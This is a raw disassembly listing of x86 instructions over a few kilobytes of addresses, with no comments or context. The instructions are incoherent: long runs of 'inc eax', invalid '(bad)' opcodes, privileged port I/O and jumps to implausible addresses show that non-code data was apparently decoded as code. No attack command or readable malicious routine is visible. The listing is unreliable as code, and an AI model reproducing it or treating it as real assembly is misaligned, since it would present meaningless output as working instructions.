  4134a1:	dec    esp
  4134a2:	shl    DWORD PTR [eax],0xd1
  4134a5:	xchg   ebp,eax
  4134a6:	pop    ds
  4134a7:	push   cs
  4134a8:	and    BYTE PTR [edx-0x2c],al
  4134ab:	mov    ah,0x40
  4134ad:	sub    esp,DWORD PTR [edx]
  4134af:	xor    al,0x94
  4134b1:	dec    eax
  4134b2:	arpl   WORD PTR [edi+0x40],ax
  4134b5:	add    ebx,edi
  4134b7:	call   0x85a1611e
  4134bc:	inc    eax
  4134bd:	inc    eax
  4134be:	inc    eax
  4134bf:	inc    eax
  4134c0:	inc    eax
  4134c1:	inc    eax
  4134c2:	int3   
  4134c3:	jne    0x413505
  4134c5:	inc    eax
  4134c6:	jbe    0x41351b
  4134c8:	lods   eax,DWORD PTR ds:[esi]
  4134c9:	int    0x52
  4134cb:	sub    BYTE PTR [ebx+0x3f],al
  4134ce:	lea    edi,[ebx]
  4134d0:	test   al,0x76
  4134d2:	mov    eax,0xc1004012
  4134d7:	inc    eax
  4134d8:	inc    eax
  4134d9:	inc    eax
  4134da:	inc    eax
  4134db:	add    BYTE PTR [eax-0x70],al
  4134de:	inc    eax
  4134df:	inc    ecx
  4134e0:	dec    ecx
  4134e1:	ja     0x4134d4
  4134e3:	or     eax,0x1404351
  4134e8:	adc    ebp,DWORD PTR [ebx]
  4134ea:	fs inc ebx
  4134ec:	imul   BYTE PTR [eax+0x40714d40]
  4134f2:	inc    esp
  4134f3:	push   0x403c404f
  4134f8:	inc    eax
  4134f9:	inc    eax
  4134fa:	inc    eax
  4134fb:	inc    eax
  4134fc:	inc    eax
  4134fd:	inc    eax
  4134fe:	inc    eax
  4134ff:	inc    DWORD PTR [eax+0x3]
  413502:	xchg   edi,eax
  413503:	add    DWORD PTR [eax+ecx*1],ebp
  413506:	mov    eax,0x7160402a
  41350b:	aad    0x16
  41350d:	inc    edx
  41350e:	inc    esp
  41350f:	inc    ebx
  413510:	inc    eax
  413511:	add    DWORD PTR [edi-0x2fe33ae4],ebx
  413517:	sub    al,BYTE PTR [eax-0x1]
  41351a:	jno    0x413544
  41351c:	push   edi
  41351d:	pushf  
  41351e:	push   esp
  41351f:	xchg   DWORD PTR [esi],ebp
  413521:	inc    eax
  413522:	inc    eax
  413523:	inc    eax
  413524:	inc    eax
  413525:	inc    eax
  413526:	inc    eax
  413527:	inc    eax
  413528:	inc    eax
  413529:	inc    eax
  41352a:	inc    eax
  41352b:	data16 lahf 
  41352d:	inc    edx
  41352e:	(bad)  
  41352f:	bound  esp,QWORD PTR [ebx+0x73]
  413532:	inc    eax
  413533:	add    al,0xbf
  413535:	push   ss
  413536:	inc    esp
  413537:	dec    esi
  413538:	imul   edi,DWORD PTR [eax],0x40
  41353b:	adc    ebp,DWORD PTR [ecx-0x30]
  41353e:	sub    al,0x35
  413540:	xor    edx,DWORD PTR [esi+0x62ff7e40]
  413546:	inc    eax
  413547:	inc    eax
  413548:	inc    eax
  413549:	inc    eax
  41354a:	inc    eax
  41354b:	inc    eax
  41354c:	inc    eax
  41354d:	inc    eax
  41354e:	add    BYTE PTR [esi+edi*2],dl
  413551:	mov    ah,0x47
  413553:	add    al,0x4
  413555:	imul   edi,DWORD PTR [edx*8+0x4043c0c6],0x50947b34
  413560:	bound  ebx,QWORD PTR [ebx]
  413562:	xor    BYTE PTR [eax+0x16],al
  413565:	imul   eax,DWORD PTR [eax-0x12],0x408c6360
  41356c:	add    BYTE PTR [eax+0x40],0x40
  413570:	inc    eax
  413571:	inc    eax
  413572:	inc    eax
  413573:	and    eax,0x7f404040
  413578:	jg     0x4135be
  41357a:	inc    ebp
  41357b:	add    al,0x47
  41357d:	inc    eax
  41357e:	xor    ah,BYTE PTR [esi+0x55]
  413581:	sub    al,0xd1
  413583:	xor    al,0x85
  413585:	xlat   BYTE PTR ds:[ebx]
  413586:	sub    eax,0x5412621b
  41358b:	add    BYTE PTR [ebx-0x5e],0x4
  41358f:	jbe    0x413596
  413591:	int    0x45
  413593:	ret    
  413594:	nop
  413595:	inc    eax
  413596:	inc    eax
  413597:	inc    eax
  413598:	inc    eax
  413599:	inc    eax
  41359a:	inc    eax
  41359b:	inc    eax
  41359c:	inc    eax
  41359d:	inc    eax
  41359e:	inc    eax
  41359f:	out    0x9,eax
  4135a1:	jae    0x41352a
  4135a3:	or     cl,dl
  4135a5:	mov    al,0x60
  4135a7:	xor    eax,0xf64705ea
  4135ac:	xchg   BYTE PTR [edi],cl
  4135ae:	inc    ebx
  4135af:	inc    eax
  4135b0:	inc    eax
  4135b1:	inc    eax
  4135b2:	inc    eax
  4135b3:	inc    eax
  4135b4:	inc    eax
  4135b5:	rol    DWORD PTR [eax+0x40],0x2d
  4135b9:	and    eax,0xa844abd1
  4135be:	das    
  4135bf:	ror    DWORD PTR [esi+0x2c905701],1
  4135c5:	adc    DWORD PTR [edi+0x61],esp
  4135c8:	adc    DWORD PTR [edi],0x4810bfb1
  4135ce:	or     eax,0xb8177c0
  4135d3:	inc    ebx
  4135d4:	lds    eax,FWORD PTR [ecx-0x35]
  4135d7:	or     dl,BYTE PTR [edx+0x60]
  4135da:	mov    cl,0xc9
  4135dc:	inc    ecx
  4135dd:	inc    eax
  4135de:	inc    eax
  4135df:	add    BYTE PTR [eax+0x40],al
  4135e2:	inc    eax
  4135e3:	inc    eax
  4135e4:	inc    eax
  4135e5:	inc    eax
  4135e6:	jb     0x41363a
  4135e8:	inc    ebx
  4135e9:	aam    0x3
  4135eb:	mov    edi,0xab38eef0
  4135f0:	inc    ecx
  4135f1:	or     BYTE PTR fs:[eax],dh
  4135f4:	bound  eax,QWORD PTR [esp+eiz*2+0x41]
  4135f8:	inc    ebx
  4135f9:	sub    al,BYTE PTR [ebx]
  4135fb:	sar    edi,1
  4135fd:	sub    al,0x28
  4135ff:	push   0x30
  413601:	xchg   esi,eax
  413602:	dec    esp
  413603:	dec    esp
  413604:	sub    BYTE PTR [esi],cl
  413606:	in     al,dx
  413607:	dec    esp
  413608:	mov    cl,bl
  41360a:	add    DWORD PTR [eax+0x40],eax
  41360d:	inc    eax
  41360e:	inc    eax
  41360f:	inc    eax
  413610:	inc    eax
  413611:	inc    eax
  413612:	inc    eax
  413613:	inc    eax
  413614:	inc    eax
  413615:	xor    ebx,DWORD PTR [edi+0x476352d5]
  41361b:	outs   dx,DWORD PTR ds:[esi]
  41361c:	arpl   WORD PTR [eax-0x79],cx
  41361f:	pop    ecx
  413620:	add    bh,ah
  413622:	test   ebx,eax
  413624:	adc    DWORD PTR [ebx],0xd42aeea8
  41362a:	inc    ebx
  41362b:	sub    esp,DWORD PTR ds:0xd044c846
  413631:	ins    BYTE PTR es:[edi],dx
  413632:	nop
  413633:	inc    eax
  413634:	inc    eax
  413635:	inc    eax
  413636:	inc    eax
  413637:	inc    eax
  413638:	inc    eax
  413639:	int3   
  41363a:	jne    0x41367c
  41363c:	aas    
  41363d:	xor    ebp,0x27e62c47
  413643:	jge    0x4136ae
  413645:	inc    ecx
  413646:	inc    ecx
  413647:	bound  ecx,QWORD PTR [edx+edx*2]
  41364a:	dec    esp
  41364b:	inc    ebx
  41364c:	push   0x48531181
  413651:	cwde   
  413652:	shr    DWORD PTR fs:[edi-0x41],1
  413656:	jbe    0x4135e1
  413658:	std    
  413659:	stc    
  41365a:	les    edi,FWORD PTR [edi-0x1f]
  41365d:	cmp    eax,0x4011ff
  413662:	rol    DWORD PTR [eax+0x40],0x40
  413666:	inc    eax
  413667:	add    BYTE PTR [eax+0x35],al
  41366a:	mov    ch,0x4f
  41366c:	out    dx,eax
  41366d:	fld    DWORD PTR [ecx]
  41366f:	jns    0x4136d5
  413671:	inc    esp
  413672:	arpl   sp,bx
  413674:	mov    ebp,0xfbd903c1
  413679:	sub    eax,0x870a8265
  41367e:	add    DWORD PTR [eax+esi*2+0xa],edx
  413682:	test   al,0x3f
  413684:	inc    ecx
  413685:	mov    bl,BYTE PTR [ebx+0x15]
  413688:	push   edx
  413689:	ja     0x4136e0
  41368b:	dec    eax
  41368c:	inc    ebx
  41368d:	inc    eax
  41368e:	inc    eax
  41368f:	inc    eax
  413690:	inc    eax
  413691:	inc    eax
  413692:	inc    eax
  413693:	inc    eax
  413694:	inc    eax
  413695:	inc    DWORD PTR [eax+0x26]
  413698:	test   BYTE PTR [edi+0x640d51c3],bh
  41369e:	xor    BYTE PTR [esi+ebp*1+0x45],ah
  4136a2:	mov    edi,0xb0138965
  4136a7:	scas   al,BYTE PTR es:[edi]
  4136a8:	iret   
  4136a9:	xchg   ecx,eax
  4136aa:	mov    esi,0x47a8d944
  4136af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b0:	add    edx,DWORD PTR [edx-0x69]
  4136b3:	sub    al,0x5c
  4136b5:	inc    eax
  4136b6:	inc    eax
  4136b7:	inc    eax
  4136b8:	inc    eax
  4136b9:	inc    eax
  4136ba:	inc    eax
  4136bb:	inc    eax
  4136bc:	inc    eax
  4136bd:	inc    eax
  4136be:	inc    eax
  4136bf:	pusha  
  4136c0:	test   edx,edi
  4136c2:	fist   WORD PTR [ecx]
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	or     BYTE PTR [edx+0x30],dl
  4136c8:	inc    ebx
  4136c9:	lods   al,BYTE PTR ds:[esi]
  4136ca:	add    DWORD PTR [eax-0x58],edi
  4136cd:	inc    eax
  4136ce:	inc    eax
  4136cf:	inc    eax
  4136d0:	inc    eax
  4136d1:	inc    eax
  4136d2:	inc    eax
  4136d3:	inc    eax
  4136d4:	inc    eax
  4136d5:	add    ch,dl
  4136d7:	cmp    eax,0x652d9097
  4136dc:	aad    0x12
  4136de:	dec    ebx
  4136df:	sub    DWORD PTR [edx+0x1a],esp
  4136e2:	sbb    DWORD PTR [ebx],eax
  4136e4:	jp     0x413676
  4136e6:	(bad)  
  4136e7:	mov    bl,0xe3
  4136e9:	inc    ebx
  4136ea:	fs cmp dh,dl
  4136ed:	inc    ebp
  4136ee:	inc    esp
  4136ef:	in     al,dx
  4136f0:	(bad)
  4136f3:	and    DWORD PTR [ecx],0x4040403b
  4136f9:	inc    eax
  4136fa:	inc    eax
  4136fb:	inc    eax
  4136fc:	and    eax,0x2c404040
  413701:	ret    0x7e4f
  413704:	mov    ds:0x6b843af,eax
  413709:	mov    WORD PTR [eax+0x48],ss
  41370c:	xlat   BYTE PTR ds:[ebx]
  41370d:	or     dl,cl
  41370f:	(bad)  
  413710:	int    0x24
  413712:	mov    ah,0xb7
  413714:	loope  0x413719
  413716:	inc    eax
  413717:	pop    edi
  413718:	push   eax
  413719:	inc    eax
  41371a:	inc    eax
  41371b:	inc    eax
  41371c:	inc    eax
  41371d:	inc    eax
  41371e:	inc    eax
  41371f:	inc    eax
  413720:	inc    eax
  413721:	inc    eax
  413722:	inc    eax
  413723:	arpl   WORD PTR [edx-0x35],ax
  413726:	or     al,BYTE PTR [ebx-0xc]
  413729:	call   0x4172e41c
  41372e:	das    
  41372f:	add    BYTE PTR [ecx+eiz*8+0x4374d544],ah
  413736:	xchg   ebx,eax
  413737:	sub    DWORD PTR [esi+0x63dd2c99],esi
  41373d:	xor    BYTE PTR [ebp+ecx*8+0x8],dl
  413741:	sub    BYTE PTR [edx+eiz*2],al
  413744:	in     eax,dx
  413745:	lods   al,BYTE PTR ds:[esi]
  413746:	add    dh,BYTE PTR cs:0x40404076
  41374d:	inc    eax
  41374e:	inc    eax
  41374f:	inc    eax
  413750:	rol    DWORD PTR [eax+0x40],0xc5
  413754:	or     eax,0x2e034731
  413759:	sbb    DWORD PTR [ecx+ecx*4],esi
  41375c:	popa   
  41375d:	sbb    eax,0xb334e785
  413762:	inc    eax
  413763:	out    0x45,al
  413765:	arpl   WORD PTR [eax+0x40],ax
  413768:	add    BYTE PTR [eax+0x40],al
  41376b:	inc    eax
  41376c:	inc    eax
  41376d:	inc    eax
  41376e:	inc    eax
  41376f:	inc    ebx
  413770:	dec    esp
  413771:	add    DWORD PTR [ebp+0x45],0x44
  413775:	(bad)  
  413776:	int3   
  413777:	nop
  413778:	sub    al,0x7d
  41377a:	adc    al,BYTE PTR [esi]
  41377c:	sub    al,0x4e
  41377e:	cld    
  41377f:	aaa    
  413780:	icebp  
  413781:	test   DWORD PTR [esi],esi
  413783:	inc    eax
  413784:	add    bh,ah
  413786:	fs inc ebx
  413788:	test   DWORD PTR [eax+0x40],eax
  41378b:	inc    eax
  41378c:	inc    eax
  41378d:	inc    eax
  41378e:	inc    eax
  41378f:	inc    eax
  413790:	inc    eax
  413791:	inc    eax
  413792:	inc    eax
  413793:	lds    ecx,FWORD PTR [ecx+0x62]
  413796:	aad    0x5b
  413798:	test   al,0xd1
  41379a:	dec    esp
  41379b:	or     DWORD PTR [ecx],ebx
  41379d:	fisttp QWORD PTR [ebx-0x33]
  4137a0:	inc    eax
  4137a1:	ret    
  4137a2:	bound  edx,QWORD PTR [edi-0x57013bbd]
  4137a8:	inc    eax
  4137a9:	fisub  DWORD PTR [ebx+eiz*2+0x1044ae12]
  4137b0:	sar    BYTE PTR [ecx],0xd
  4137b3:	or     esi,DWORD PTR [edi]
  4137b5:	add    eax,0x4040402c
  4137ba:	inc    eax
  4137bb:	inc    eax
  4137bc:	inc    eax
  4137bd:	int3   
  4137be:	jne    0x413800
  4137c0:	lods   al,BYTE PTR ds:[esi]
  4137c1:	inc    ebx
  4137c2:	inc    ebp
  4137c3:	bound  ebp,QWORD PTR [ecx+0x45]
  4137c6:	jnp    0x4137c8
  4137c8:	add    eax,0x9404128
  4137cd:	push   ecx
  4137ce:	test   ch,0xcb
  4137d1:	adc    BYTE PTR [ebx-0x3],al
  4137d4:	lods   eax,DWORD PTR ds:[si]
  4137d6:	fs inc ecx
  4137d8:	adc    al,BYTE PTR [eax+esi*1+0x42]
  4137dc:	add    DWORD PTR [ebp-0x8],ecx
  4137df:	into   
  4137e0:	inc    eax
  4137e1:	add    cl,al
  4137e3:	inc    eax
  4137e4:	inc    eax
  4137e5:	inc    eax
  4137e6:	inc    eax
  4137e7:	add    BYTE PTR [eax-0x44],al
  4137ea:	cs test al,0xe6
  4137ed:	sub    dl,BYTE PTR [ecx]
  4137ef:	lods   al,BYTE PTR ds:[esi]
  4137f0:	and    al,0x15
  4137f2:	clc    
  4137f3:	inc    edi
  4137f4:	fild   WORD PTR ds:0xcccccccc
  4137fa:	int3   
  4137fb:	int3   
  4137fc:	int3   
  4137fd:	int3   
  4137fe:	int3   
  4137ff:	int3   
  413800:	inc    edx
  413801:	dec    ebp
  413802:	inc    esp
  413803:	imul   esp,DWORD PTR [edx-0x7b],0xffffff83
  413807:	dec    ecx
  413808:	jno    0x4137ac
  41380a:	sub    eax,0x7543a2b8
  41380f:	add    DWORD PTR [ebp-0x56],eax
  413812:	jle    0x41385c
  413814:	xchg   ecx,eax
  413815:	nop
  413816:	fiadd  WORD PTR [eax+0x40]
  413819:	inc    eax
  41381a:	inc    eax
  41381b:	inc    eax
  41381c:	inc    eax
  41381d:	inc    eax
  41381e:	inc    eax
  41381f:	inc    DWORD PTR [eax+0x6a]
  413822:	xchg   ecx,eax
  413823:	or     eax,0xd44c67c5
  413828:	bound  eax,QWORD PTR [ebx]
  41382a:	outs   dx,DWORD PTR ds:[esi]
  41382b:	mov    dl,0x47
  41382d:	adc    al,0xa4
  41382f:	inc    ebx
  413830:	mov    ebx,0xced69149
  413835:	push   edx
  413836:	sub    edx,ecx
  413838:	pop    ds
  413839:	adc    DWORD PTR [ebx+0x65],0x2e
  41383d:	or     eax,0x483f9859
  413842:	adc    eax,0xd4cb44a8
  413847:	inc    eax
  413848:	inc    eax
  413849:	inc    eax
  41384a:	inc    eax
  41384b:	inc    eax
  41384c:	inc    eax
  41384d:	inc    eax
  41384e:	inc    eax
  41384f:	inc    eax
  413850:	inc    eax
  413851:	imul   ecx,ecx,0xffffff80
  413854:	adc    BYTE PTR ds:0xb66b102d,al
  41385a:	lods   al,BYTE PTR ds:[esi]
  41385b:	mov    edi,0xa47ca9d7
  413860:	ins    BYTE PTR es:[edi],dx
  413861:	fcmovu st,st(0)
  413863:	and    al,0x52
  413865:	push   ds
  413866:	aad    0x5
  413868:	int3   
  413869:	inc    ecx
  41386a:	inc    eax
  41386b:	inc    eax
  41386c:	inc    eax
  41386d:	inc    eax
  41386e:	inc    eax
  41386f:	inc    eax
  413870:	inc    eax
  413871:	inc    eax
  413872:	add    bl,ch
  413874:	and    al,0x17
  413876:	gs dec esi
  413878:	inc    ebx
  413879:	mov    esp,0x45017e43
  41387e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387f:	inc    BYTE PTR [ebx-0x24]
  413882:	xor    BYTE PTR [esi+0x63],dl
  413885:	xchg   ebx,eax
  413886:	popa   
  413887:	inc    eax
  413888:	inc    eax
  413889:	inc    eax
  41388a:	inc    eax
  41388b:	inc    eax
  41388c:	inc    eax
  41388d:	and    eax,0x44404040
  413892:	sbb    esp,DWORD PTR [ebp-0x40fe285c]
  413898:	loope  0x4138c6
  41389a:	sub    BYTE PTR [ecx+0x4043d64e],0x40
  4138a1:	inc    eax
  4138a2:	inc    eax
  4138a3:	inc    eax
  4138a4:	inc    eax
  4138a5:	inc    eax
  4138a6:	inc    eax
  4138a7:	inc    eax
  4138a8:	inc    eax
  4138a9:	jb     0x41390e
  4138ab:	jp     0x41390f
  4138ad:	test   al,0x8d
  4138af:	sbb    eax,0x56a41201
  4138b4:	xor    al,0x68
  4138b6:	inc    ebx
  4138b7:	jecxz  0x413920
  4138b9:	mov    dh,0x46
  4138bb:	lea    esi,[edi+edi*1]
  4138be:	nop
  4138bf:	xchg   ebp,eax
  4138c0:	inc    eax
  4138c1:	inc    eax
  4138c2:	inc    eax
  4138c3:	inc    eax
  4138c4:	inc    eax
  4138c5:	inc    eax
  4138c6:	rol    DWORD PTR [eax+0x40],0x81
  4138ca:	dec    ebx
  4138cb:	mov    ch,0x44
  4138cd:	inc    ebp
  4138ce:	ins    DWORD PTR es:[edi],dx
  4138cf:	icebp  
  4138d0:	dec    esi
  4138d1:	inc    esp
  4138d2:	adc    esp,DWORD PTR [edx+0x4345622c]
  4138d8:	mov    DWORD PTR [ebx],0x64784633
  4138de:	cld    
  4138df:	sar    DWORD PTR [ebx+0x20],1
  4138e2:	icebp  
  4138e3:	mov    ch,0xc5
  4138e5:	xor    al,0x6a
  4138e7:	rol    DWORD PTR [edi+0x4],0x44
  4138eb:	mov    al,ds:0x40404e
  4138f0:	inc    eax
  4138f1:	inc    eax
  4138f2:	inc    eax
  4138f3:	inc    eax
  4138f4:	inc    eax
  4138f5:	inc    eax
  4138f6:	and    bl,BYTE PTR [ebx+esi*4+0x6e]
  4138fa:	sub    BYTE PTR [ecx],dl
  4138fc:	adc    eax,0xdc4c8efe
  413901:	jnp    0x413941
  413903:	ins    BYTE PTR es:[edi],dx
  413904:	leave  
  413905:	inc    esp
  413906:	push   edx
  413907:	jge    0x413962
  413909:	stos   BYTE PTR es:[edi],al
  41390a:	dec    ebp
  41390b:	adc    DWORD PTR [esi],esp
  41390d:	sub    al,0xa0
  41390f:	inc    eax
  413910:	inc    eax
  413911:	inc    eax
  413912:	inc    eax
  413913:	inc    eax
  413914:	inc    eax
  413915:	inc    eax
  413916:	inc    eax
  413917:	inc    eax
  413918:	inc    eax
  413919:	addr16 inc ecx
  41391b:	xor    al,BYTE PTR [edx]
  41391d:	push   ebp
  41391e:	inc    ecx
  41391f:	jbe    0x413936
  413921:	push   0x11268b43
  413926:	xchg   esp,eax
  413927:	aad    0xc9
  413929:	sub    al,0x30
  41392b:	jb     0x41396e
  41392d:	inc    ebx
  41392e:	mov    BYTE PTR [esp+edi*1-0x7ef95f99],cl
  413935:	push   ebp
  413936:	(bad)  
  413937:	cli    
  413938:	inc    ecx
  413939:	jno    0x413982
  41393b:	test   al,0x5b
  41393d:	(bad)  
  41393e:	cli    
  41393f:	inc    eax
  413940:	inc    eax
  413941:	inc    eax
  413942:	inc    eax
  413943:	inc    eax
  413944:	inc    eax
  413945:	int3   
  413946:	jne    0x413988
  413948:	inc    esp
  413949:	adc    al,0x78
  41394b:	test   DWORD PTR [edx+0x0],ebx
  41394e:	inc    esp
  41394f:	sahf   
  413950:	sub    al,0x43
  413952:	bound  eax,QWORD PTR [ebx-0x57]
  413955:	xor    esi,DWORD PTR [ebx]
  413957:	jnp    0x4139cd
  413959:	xor    al,BYTE PTR [edi-0x70]
  41395c:	inc    eax
  41395d:	add    cl,al
  41395f:	inc    eax
  413960:	inc    eax
  413961:	inc    eax
  413962:	inc    eax
  413963:	add    BYTE PTR [eax-0x18],al
  413966:	xchg   DWORD PTR [edx-0x6],edx
  413969:	int    0xf8
  41396b:	fmul   QWORD PTR [esi+0x6691c3a6]
  413971:	inc    edi
  413972:	bound  edx,QWORD PTR [edx+0x43]
  413975:	cmp    ebx,esp
  413977:	inc    eax
  413978:	inc    eax
  413979:	inc    eax
  41397a:	inc    eax
  41397b:	inc    eax
  41397c:	inc    eax
  41397d:	inc    eax
  41397e:	inc    eax
  41397f:	inc    DWORD PTR [eax+0x4f]
  413982:	pushf  
  413983:	into   
  413984:	inc    ebp
  413985:	enter  0x85d1,0xc2
  413989:	adc    bh,BYTE PTR [esi+eiz*1-0x7e]
  41398d:	inc    edx
  41398e:	jge    0x4139ee
  413990:	adc    al,0x2e
  413992:	gs inc esp
  413994:	sub    ebp,DWORD PTR [ecx]
  413996:	jg     0x4139b2
  413998:	test   BYTE PTR [eax+0x40],0x40
  41399c:	inc    eax
  41399d:	inc    eax
  41399e:	inc    eax
  41399f:	inc    eax
  4139a0:	inc    eax
  4139a1:	inc    eax
  4139a2:	inc    eax
  4139a3:	dec    edi
  4139a4:	sub    ax,0x27ce
  4139a8:	and    BYTE PTR [ebx+0x729a33c7],cl
  4139ae:	imul   DWORD PTR [eax+0x48c462df]
  4139b4:	inc    eax
  4139b5:	inc    eax
  4139b6:	inc    eax
  4139b7:	inc    eax
  4139b8:	inc    eax
  4139b9:	inc    eax
  4139ba:	inc    eax
  4139bb:	inc    eax
  4139bc:	add    BYTE PTR ds:0x411053c5,dl
  4139c2:	pop    es
  4139c3:	and    DWORD PTR [edx],esi
  4139c5:	popa   
  4139c6:	inc    edx
  4139c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139c8:	lods   al,BYTE PTR ds:[esi]
  4139c9:	inc    ebx
  4139ca:	jg     0x413a39
  4139cc:	and    eax,0x413efefa
  4139d1:	xor    dl,ah
  4139d3:	ret    0x540a
  4139d6:	inc    esp
  4139d7:	sub    eax,0x36d19c58
  4139dc:	xchg   ebx,eax
  4139dd:	cli    
  4139de:	inc    eax
  4139df:	inc    eax
  4139e0:	inc    eax
  4139e1:	inc    eax
  4139e2:	inc    eax
  4139e3:	inc    eax
  4139e4:	and    eax,0x2c404040
  4139e9:	pop    ebx
  4139ea:	sub    al,0xc1
  4139ec:	push   0x47
  4139ee:	lods   eax,DWORD PTR ds:[esi]
  4139ef:	cwde   
  4139f0:	jo     0x4139bd
  4139f2:	xchg   edx,eax
  4139f3:	jb     0x413997
  4139f5:	rol    BYTE PTR [ebx+edx*8-0x2b],0xb0
  4139fa:	mov    edi,0xd33206a2
  4139ff:	scas   al,BYTE PTR es:[edi]
  413a00:	jge    0x413a28
  413a02:	inc    edx
  413a03:	cmp    ah,BYTE PTR gs:[edx+0x40]
  413a07:	xchg   esi,eax
  413a08:	inc    eax
  413a09:	inc    eax
  413a0a:	inc    eax
  413a0b:	inc    eax
  413a0c:	inc    eax
  413a0d:	inc    eax
  413a0e:	inc    eax
  413a0f:	inc    eax
  413a10:	inc    eax
  413a11:	inc    eax
  413a12:	imul   BYTE PTR [esi-0x3d5eb3ea]
  413a18:	lock scas al,BYTE PTR es:[edi]
  413a1a:	inc    esp
  413a1b:	bound  edx,QWORD PTR [edx+0xf]
  413a1e:	inc    ecx
  413a1f:	cmp    DWORD PTR [eax+0x7d],esp
  413a22:	sub    al,0x9b
  413a24:	shl    BYTE PTR ds:0x6607eab2,1
  413a2a:	outs   dx,BYTE PTR ds:[esi]
  413a2b:	in     al,dx
  413a2c:	inc    edi
  413a2d:	test   eax,0x40401228
  413a32:	inc    eax
  413a33:	inc    eax
  413a34:	inc    eax
  413a35:	inc    eax
  413a36:	rol    DWORD PTR [eax+0x40],0x73
  413a3a:	xchg   esp,eax
  413a3b:	int    0xb0
  413a3d:	and    eax,0x67c196ab
  413a42:	rcr    BYTE PTR [eax+0x31433a44],1
  413a48:	push   esi
  413a49:	pop    ebx
  413a4a:	mov    eax,ds:0xd27662f6
  413a4f:	ja     0x413a11
  413a51:	gs xchg edx,eax
  413a53:	inc    esp
  413a54:	lds    eax,FWORD PTR [ecx]
  413a56:	lock imul ebp,DWORD PTR [ecx],0xfffffff5
  413a5a:	add    eax,0x40404f2c
  413a5f:	add    BYTE PTR [eax+0x40],al
  413a62:	inc    eax
  413a63:	inc    eax
  413a64:	inc    eax
  413a65:	inc    eax
  413a66:	arpl   bx,dx
  413a68:	aas    
  413a69:	push   ebx
  413a6a:	dec    edx
  413a6b:	mov    ecx,0x5544786c
  413a70:	pop    edx
  413a71:	shl    BYTE PTR [ecx+0x4032c566],0x40
  413a78:	inc    eax
  413a79:	inc    eax
  413a7a:	inc    eax
  413a7b:	inc    eax
  413a7c:	inc    eax
  413a7d:	inc    eax
  413a7e:	inc    eax
  413a7f:	inc    eax
  413a80:	cmp    esi,DWORD PTR [esi+eiz*4+0x5907b22]
  413a87:	dec    esp
  413a88:	add    eax,0x5b409241
  413a8d:	jle    0x413a8d
  413a8f:	add    BYTE PTR [ebx+0x43],ah
  413a92:	add    BYTE PTR [edx+0x4444999f],bh
  413a98:	xor    BYTE PTR es:[esi+0x2c660458],ah
  413a9f:	ss js  0x413ae2
  413aa2:	inc    eax
  413aa3:	inc    eax
  413aa4:	inc    eax
  413aa5:	inc    eax
  413aa6:	inc    eax
  413aa7:	int3   
  413aa8:	jne    0x413aea
  413aaa:	cwde   
  413aab:	pop    ebx
  413aac:	rcl    DWORD PTR [ebx+0xa],0x6a
  413ab0:	and    eax,0x91a54781
  413ab5:	inc    esi
  413ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab7:	aad    0xa8
  413ab9:	bound  eax,QWORD PTR [ebp+0x639260f1]
  413abf:	dec    edx
  413ac0:	jp     0x413b2a
  413ac2:	inc    ebx
  413ac3:	push   ebx
  413ac4:	push   ebx
  413ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ac6:	sub    cl,dh
  413ac8:	sub    ch,al
  413aca:	nop
  413acb:	jecxz  0x413b0d
  413acd:	add    cl,al
  413acf:	inc    eax
  413ad0:	inc    eax
  413ad1:	inc    eax
  413ad2:	inc    eax
  413ad3:	add    BYTE PTR [eax+0x48],al
  413ad6:	outs   dx,DWORD PTR ds:[esi]
  413ad7:	cld    
  413ad8:	and    esp,DWORD PTR [esi+eiz*2+0x48]
  413adc:	sbb    eax,0x4462d3c0
  413ae1:	add    DWORD PTR [ecx],eax
  413ae3:	inc    ebx
  413ae4:	xchg   BYTE PTR [eax+0x65],bh
  413ae7:	inc    edx
  413ae8:	sub    eax,0x45d16cf8
  413aed:	inc    eax
  413aee:	jno    0x413b4a
  413af0:	push   0x40406a62
  413af5:	inc    eax
  413af6:	inc    eax
  413af7:	inc    eax
  413af8:	inc    eax
  413af9:	inc    eax
  413afa:	inc    eax
  413afb:	inc    DWORD PTR [eax+0x42]
  413afe:	dec    edx
  413aff:	je     0x413b10
  413b01:	test   eax,0x31b410cd
  413b06:	pop    ebp
  413b07:	inc    eax
  413b08:	shl    BYTE PTR [ebx+ebp*2-0x526dfb4c],cl
  413b0f:	jo     0x413b37
  413b11:	inc    ecx
  413b12:	out    dx,al
  413b13:	add    eax,0x400b41ad
  413b18:	inc    eax
  413b19:	inc    eax
  413b1a:	inc    eax
  413b1b:	inc    eax
  413b1c:	inc    eax
  413b1d:	inc    eax
  413b1e:	inc    eax
  413b1f:	inc    eax
  413b20:	inc    eax
  413b21:	pusha  
  413b22:	inc    esi
  413b23:	sub    al,BYTE PTR [ebp+ecx*8+0x63]
  413b27:	inc    ecx
  413b28:	pop    ecx
  413b29:	inc    eax
  413b2a:	xor    eax,ecx
  413b2c:	sub    al,0x41
  413b2e:	pop    ecx
  413b2f:	inc    ebx
  413b30:	fbstp  TBYTE PTR [edx-0x63]
  413b33:	inc    ebx
  413b34:	data16 out 0x40,al
  413b37:	xor    BYTE PTR [esi-0x3ac3bec0],al
  413b3d:	ins    BYTE PTR es:[edi],dx
  413b3e:	lods   eax,DWORD PTR ds:[esi]
  413b3f:	xchg   esp,eax
  413b40:	jmp    FWORD PTR [ebp-0x4f]
  413b43:	jge    0x413b48
  413b45:	gs inc eax
  413b47:	inc    eax
  413b48:	inc    eax
  413b49:	inc    eax
  413b4a:	inc    eax
  413b4b:	inc    eax
  413b4c:	inc    eax
  413b4d:	inc    eax
  413b4e:	add    BYTE PTR [edi+eax*2+0xb],ch
  413b52:	inc    eax
  413b53:	or     eax,0xf4b0cac3
  413b58:	test   DWORD PTR [eax],eax
  413b5a:	add    DWORD PTR [ebx+0x40],edx
  413b5d:	inc    eax
  413b5e:	inc    eax
  413b5f:	inc    eax
  413b60:	inc    eax
  413b61:	inc    eax
  413b62:	and    eax,0x49404040
  413b67:	and    BYTE PTR fs:[eax+0x4440d143],ch
  413b6e:	xor    al,0x44
  413b70:	mov    bl,0xe6
  413b72:	nop
  413b73:	sub    edx,DWORD PTR [ebx]
  413b75:	icebp  
  413b76:	inc    ecx
  413b77:	sub    al,0xc0
  413b79:	loop   0x413bbb
  413b7b:	inc    eax
  413b7c:	inc    eax
  413b7d:	inc    eax
